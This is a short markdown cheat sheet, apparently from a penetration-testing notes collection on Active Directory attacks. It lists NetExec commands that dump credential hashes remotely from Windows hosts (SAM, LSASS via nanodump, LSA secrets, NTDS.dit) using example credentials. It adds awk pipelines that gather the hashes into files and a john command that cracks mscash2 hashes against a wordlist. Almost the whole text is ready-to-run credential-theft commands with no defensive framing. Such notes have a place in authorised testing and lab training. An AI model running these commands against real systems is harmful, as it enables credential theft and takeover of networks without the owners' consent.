---
title: NetExec - Remote Hash Dumping
category: ad
subcategory: ad-attacks
os: linux
command: netexec smb target -u user -p pass --sam
tools: netexec, crackmapexec, john
---


### Dump SAM (local admin)

```bash
netexec smb 10.10.240.35 -u 'svc_backup' -p 'Autumn2024!' --sam
netexec smb 10.10.240.35 -u 'svc_backup' -p 'Autumn2024!' --sam | fgrep -v '[' | awk -F: '{print $4}' | tee dumped_hashes.txt
```

### Dump LSASS via nanodump (local admin)

```bash
netexec smb 10.10.240.35 -u 'svc_backup' -p 'Autumn2024!' -M nanodump
netexec smb 10.10.240.35 -u 'svc_backup' -p 'Autumn2024!' -M nanodump | fgrep -v '[' | awk -F: '{print $2}' | tee -a dumped_hashes.txt
```

### Dump LSA (local admin)

```bash
netexec smb 10.10.240.35 -u 'svc_backup' -p 'Autumn2024!' --lsa
netexec smb 10.10.240.35 -u 'svc_backup' -p 'Autumn2024!' --lsa secdump
```

LSA may yield mscash hashes which need cracking:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=mscash2
```

### Dump NTDS.dit (Domain Admin / DC local admin)

```bash
netexec smb 10.10.240.35 -u 'svc_backup' -p 'Autumn2024!' -M ntdsutil | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt
```

### Cleanup collected hashes

```bash
awk 'NF {print $1}' dumped_hashes.txt | sort | uniq | tee unique_hashes.txt
```
